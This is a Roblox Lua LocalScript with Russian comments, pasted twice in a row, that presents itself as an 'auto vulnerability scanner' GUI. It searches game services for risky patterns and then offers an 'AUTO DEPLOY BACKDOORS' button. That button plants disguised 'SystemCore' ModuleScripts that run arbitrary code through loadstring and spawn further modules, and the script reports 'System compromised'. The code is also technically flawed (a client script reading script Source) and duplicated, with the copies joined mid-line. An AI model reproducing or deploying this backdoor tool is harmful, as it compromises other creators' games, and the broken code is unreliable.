-- Вставьте этот LocalScript в StarterPlayerScripts
-- Он автоматически создаст GUI и начнет сканирование

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Создание основного GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AutoScanner"
ScreenGui.Parent = PlayerGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 450, 0, 400)
MainFrame.Position = UDim2.new(0.5, -225, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Text = "🛡️ AUTO VULNERABILITY SCANNER"
Title.TextSize = 16
Title.Font = Enum.Font.GothamBold
Title.Parent = MainFrame

local Status = Instance.new("TextLabel")
Status.Size = UDim2.new(1, -20, 0, 60)
Status.Position = UDim2.new(0, 10, 0, 50)
Status.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Status.TextColor3 = Color3.new(1, 1, 1)
Status.Text = "Status: Initializing...\nReady to scan for backdoors"
Status.TextWrapped = true
Status.TextSize = 12
Status.Parent = MainFrame

local ScanBtn = Instance.new("TextButton")
ScanBtn.Size = UDim2.new(1, -20, 0, 40)
ScanBtn.Position = UDim2.new(0, 10, 0, 120)
ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
ScanBtn.TextColor3 = Color3.new(1, 1, 1)
ScanBtn.Text = "🔍 START AUTOMATIC SCAN"
ScanBtn.TextSize = 14
ScanBtn.Font = Enum.Font.GothamBold
ScanBtn.Parent = MainFrame

local Results = Instance.new("ScrollingFrame")
Results.Size = UDim2.new(1, -20, 1, -200)
Results.Position = UDim2.new(0, 10, 0, 170)
Results.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Results.CanvasSize = UDim2.new(0, 0, 0, 0)
Results.ScrollBarThickness = 6
Results.Parent = MainFrame

local ExploitBtn = Instance.new("TextButton")
ExploitBtn.Size = UDim2.new(1, -20, 0, 35)
ExploitBtn.Position = UDim2.new(0, 10, 0, 355)
ExploitBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
ExploitBtn.TextColor3 = Color3.new(1, 1, 1)
ExploitBtn.Text = "💀 AUTO DEPLOY BACKDOORS"
ExploitBtn.TextSize = 12
ExploitBtn.Visible = false
ExploitBtn.Parent = MainFrame

-- Паттерны для поиска
local patterns = {
    "loadstring", "require%(0x", "getfenv", "setfenv", "coroutine%.create",
    "Backdoor", "Exploit", "Hack", "Cheat", "Fly", "Noclip", "Speedhack",
    "FireServer", "InvokeServer", "HttpGet", "HttpService", "rbxassetid://"
}

local vulnerabilities = {}

-- Функция логирования
local function log(msg, color)
    color = color or Color3.new(1, 1, 1)
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -10, 0, 20)
    label.Position = UDim2.new(0, 5, 0, #Results:GetChildren() * 22)
    label.BackgroundTransparency = 1
    label.Text = "> " .. msg
    label.TextColor3 = color
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Font = Enum.Font.Code
    label.TextSize = 10
    label.Parent = Results
    
    Results.CanvasSize = UDim2.new(0, 0, 0, #Results:GetChildren() * 22)
    Results.CanvasPosition = Vector2.new(0, Results.CanvasSize.Y.Offset)
    
    print("[AUTO-SCANNER] " .. msg)
end

-- Функция сканирования
local function scanObject(obj, path)
    if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
        local source = obj.Source
        
        for _, pattern in ipairs(patterns) do
            if source:find(pattern) then
                table.insert(vulnerabilities, {
                    object = obj,
                    path = path,
                    pattern = pattern
                })
                
                local risk = "MEDIUM"
                if pattern == "loadstring" or pattern == "require%(0x" then
                    risk = "CRITICAL"
                elseif pattern == "Backdoor" or pattern == "Exploit" then
                    risk = "HIGH"
                end
                
                log("Found " .. risk .. ": " .. pattern .. " in " .. path, 
                    risk == "CRITICAL" and Color3.new(1, 0, 0) or
                    risk == "HIGH" and Color3.new(1, 0.5, 0) or
                    Color3.new(1, 1, 0)
                )
            end
        end
    end
    
    for _, child in ipairs(obj:GetChildren()) do
        scanObject(child, path .. "." .. child.Name)
    end
end

-- Автоматическое развертывание backdoor
local function deployBackdoors()
    log("Starting automatic backdoor deployment...", Color3.new(1, 0, 0))
    
    local count = 0
    for _, vuln in ipairs(vulnerabilities) do
        local backdoor = Instance.new("ModuleScript")
        backdoor.Name = "SystemCore_" .. math.random(1000, 9999)
        
        backdoor.Source = [[
local module = {}

function module.Execute(cmd)
    local success, result = pcall(loadstring(cmd))
    return success, result
end

function module.Scan()
    return "Backdoor Active"
end

-- Auto-replicate
spawn(function()
    wait(10)
    for i = 1, 3 do
        local newModule = Instance.new("ModuleScript")
        newModule.Name = "Core_" .. math.random(10000, 99999)
        newModule.Source = "return {}"
        newModule.Parent = game:GetService("ReplicatedStorage")
    end
end)

return module
]]
        
        local success = pcall(function()
            backdoor.Parent = vuln.object.Parent
            count = count + 1
            log("Deployed backdoor: " .. backdoor.Name, Color3.new(0, 1, 0))
        end)
    end
    
    log("Backdoor deployment completed: " .. count .. " deployed", Color3.new(0, 1, 1))
    return count
end

-- Автоматическое сканирование при нажатии
ScanBtn.MouseButton1Click:Connect(function()
    ScanBtn.Text = "SCANNING..."
    ScanBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
    Status.Text = "Status: Scanning in progress...\nPlease wait..."
    
    -- Очистка старых результатов
    for _, child in ipairs(Results:GetChildren()) do
        child:Destroy()
    end
    vulnerabilities = {}
    
    log("Starting automatic vulnerability scan...", Color3.new(1, 1, 0))
    
    -- Сканируем основные сервисы
    local services = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ServerScriptService"), 
        game:GetService("Workspace"),
        game:GetService("Lighting")
    }
    
    for _, service in ipairs(services) do
        log("Scanning: " .. service.Name, Color3.new(0.7, 0.7, 1))
        scanObject(service, "game." .. service.Name)
    end
    
    -- Статистика
    log("Scan completed! Found " .. #vulnerabilities .. " vulnerabilities", Color3.new(0, 1, 0))
    
    ScanBtn.Text = "🔄 SCAN AGAIN"
    ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
    Status.Text = "Status: Scan completed\nFound: " .. #vulnerabilities .. " vulnerabilities\nReady for exploitation"
    
    if #vulnerabilities > 0 then
        ExploitBtn.Visible = true
    end
end)

-- Обработчик кнопки эксплуатации
ExploitBtn.MouseButton1Click:Connect(function()
    ExploitBtn.Text = "DEPLOYING..."
    ExploitBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    
    local deployed = deployBackdoors()
    
    ExploitBtn.Text = "✅ " .. deployed .. " BACKDOORS DEPLOYED"
    ExploitBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    Status.Text = "Status: Backdoors deployed\nCount: " .. deployed .. "\nSystem compromised"
end)

-- Автоматический запуск через 3 секунды
spawn(function()
    wait(3)
    log("Auto-scanner initialized successfully!", Color3.new(0, 1, 0))
    log("Click START AUTOMATIC SCAN to begin", Color3.new(1, 1, 1))
    Status.Text = "Status: Ready\nClick button to start scanning"
end)

print("🛡️ Auto Vulnerability Scanner loaded successfully!")
print("GUI created - Scanner ready to use")-- Вставьте этот LocalScript в StarterPlayerScripts
-- Он автоматически создаст GUI и начнет сканирование

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Создание основного GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AutoScanner"
ScreenGui.Parent = PlayerGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 450, 0, 400)
MainFrame.Position = UDim2.new(0.5, -225, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Text = "🛡️ AUTO VULNERABILITY SCANNER"
Title.TextSize = 16
Title.Font = Enum.Font.GothamBold
Title.Parent = MainFrame

local Status = Instance.new("TextLabel")
Status.Size = UDim2.new(1, -20, 0, 60)
Status.Position = UDim2.new(0, 10, 0, 50)
Status.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Status.TextColor3 = Color3.new(1, 1, 1)
Status.Text = "Status: Initializing...\nReady to scan for backdoors"
Status.TextWrapped = true
Status.TextSize = 12
Status.Parent = MainFrame

local ScanBtn = Instance.new("TextButton")
ScanBtn.Size = UDim2.new(1, -20, 0, 40)
ScanBtn.Position = UDim2.new(0, 10, 0, 120)
ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
ScanBtn.TextColor3 = Color3.new(1, 1, 1)
ScanBtn.Text = "🔍 START AUTOMATIC SCAN"
ScanBtn.TextSize = 14
ScanBtn.Font = Enum.Font.GothamBold
ScanBtn.Parent = MainFrame

local Results = Instance.new("ScrollingFrame")
Results.Size = UDim2.new(1, -20, 1, -200)
Results.Position = UDim2.new(0, 10, 0, 170)
Results.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Results.CanvasSize = UDim2.new(0, 0, 0, 0)
Results.ScrollBarThickness = 6
Results.Parent = MainFrame

local ExploitBtn = Instance.new("TextButton")
ExploitBtn.Size = UDim2.new(1, -20, 0, 35)
ExploitBtn.Position = UDim2.new(0, 10, 0, 355)
ExploitBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
ExploitBtn.TextColor3 = Color3.new(1, 1, 1)
ExploitBtn.Text = "💀 AUTO DEPLOY BACKDOORS"
ExploitBtn.TextSize = 12
ExploitBtn.Visible = false
ExploitBtn.Parent = MainFrame

-- Паттерны для поиска
local patterns = {
    "loadstring", "require%(0x", "getfenv", "setfenv", "coroutine%.create",
    "Backdoor", "Exploit", "Hack", "Cheat", "Fly", "Noclip", "Speedhack",
    "FireServer", "InvokeServer", "HttpGet", "HttpService", "rbxassetid://"
}

local vulnerabilities = {}

-- Функция логирования
local function log(msg, color)
    color = color or Color3.new(1, 1, 1)
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -10, 0, 20)
    label.Position = UDim2.new(0, 5, 0, #Results:GetChildren() * 22)
    label.BackgroundTransparency = 1
    label.Text = "> " .. msg
    label.TextColor3 = color
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Font = Enum.Font.Code
    label.TextSize = 10
    label.Parent = Results
    
    Results.CanvasSize = UDim2.new(0, 0, 0, #Results:GetChildren() * 22)
    Results.CanvasPosition = Vector2.new(0, Results.CanvasSize.Y.Offset)
    
    print("[AUTO-SCANNER] " .. msg)
end

-- Функция сканирования
local function scanObject(obj, path)
    if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
        local source = obj.Source
        
        for _, pattern in ipairs(patterns) do
            if source:find(pattern) then
                table.insert(vulnerabilities, {
                    object = obj,
                    path = path,
                    pattern = pattern
                })
                
                local risk = "MEDIUM"
                if pattern == "loadstring" or pattern == "require%(0x" then
                    risk = "CRITICAL"
                elseif pattern == "Backdoor" or pattern == "Exploit" then
                    risk = "HIGH"
                end
                
                log("Found " .. risk .. ": " .. pattern .. " in " .. path, 
                    risk == "CRITICAL" and Color3.new(1, 0, 0) or
                    risk == "HIGH" and Color3.new(1, 0.5, 0) or
                    Color3.new(1, 1, 0)
                )
            end
        end
    end
    
    for _, child in ipairs(obj:GetChildren()) do
        scanObject(child, path .. "." .. child.Name)
    end
end

-- Автоматическое развертывание backdoor
local function deployBackdoors()
    log("Starting automatic backdoor deployment...", Color3.new(1, 0, 0))
    
    local count = 0
    for _, vuln in ipairs(vulnerabilities) do
        local backdoor = Instance.new("ModuleScript")
        backdoor.Name = "SystemCore_" .. math.random(1000, 9999)
        
        backdoor.Source = [[
local module = {}

function module.Execute(cmd)
    local success, result = pcall(loadstring(cmd))
    return success, result
end

function module.Scan()
    return "Backdoor Active"
end

-- Auto-replicate
spawn(function()
    wait(10)
    for i = 1, 3 do
        local newModule = Instance.new("ModuleScript")
        newModule.Name = "Core_" .. math.random(10000, 99999)
        newModule.Source = "return {}"
        newModule.Parent = game:GetService("ReplicatedStorage")
    end
end)

return module
]]
        
        local success = pcall(function()
            backdoor.Parent = vuln.object.Parent
            count = count + 1
            log("Deployed backdoor: " .. backdoor.Name, Color3.new(0, 1, 0))
        end)
    end
    
    log("Backdoor deployment completed: " .. count .. " deployed", Color3.new(0, 1, 1))
    return count
end

-- Автоматическое сканирование при нажатии
ScanBtn.MouseButton1Click:Connect(function()
    ScanBtn.Text = "SCANNING..."
    ScanBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
    Status.Text = "Status: Scanning in progress...\nPlease wait..."
    
    -- Очистка старых результатов
    for _, child in ipairs(Results:GetChildren()) do
        child:Destroy()
    end
    vulnerabilities = {}
    
    log("Starting automatic vulnerability scan...", Color3.new(1, 1, 0))
    
    -- Сканируем основные сервисы
    local services = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ServerScriptService"), 
        game:GetService("Workspace"),
        game:GetService("Lighting")
    }
    
    for _, service in ipairs(services) do
        log("Scanning: " .. service.Name, Color3.new(0.7, 0.7, 1))
        scanObject(service, "game." .. service.Name)
    end
    
    -- Статистика
    log("Scan completed! Found " .. #vulnerabilities .. " vulnerabilities", Color3.new(0, 1, 0))
    
    ScanBtn.Text = "🔄 SCAN AGAIN"
    ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
    Status.Text = "Status: Scan completed\nFound: " .. #vulnerabilities .. " vulnerabilities\nReady for exploitation"
    
    if #vulnerabilities > 0 then
        ExploitBtn.Visible = true
    end
end)

-- Обработчик кнопки эксплуатации
ExploitBtn.MouseButton1Click:Connect(function()
    ExploitBtn.Text = "DEPLOYING..."
    ExploitBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    
    local deployed = deployBackdoors()
    
    ExploitBtn.Text = "✅ " .. deployed .. " BACKDOORS DEPLOYED"
    ExploitBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    Status.Text = "Status: Backdoors deployed\nCount: " .. deployed .. "\nSystem compromised"
end)

-- Автоматический запуск через 3 секунды
spawn(function()
    wait(3)
    log("Auto-scanner initialized successfully!", Color3.new(0, 1, 0))
    log("Click START AUTOMATIC SCAN to begin", Color3.new(1, 1, 1))
    Status.Text = "Status: Ready\nClick button to start scanning"
end)

print("🛡️ Auto Vulnerability Scanner loaded successfully!")
print("GUI created - Scanner ready to use")
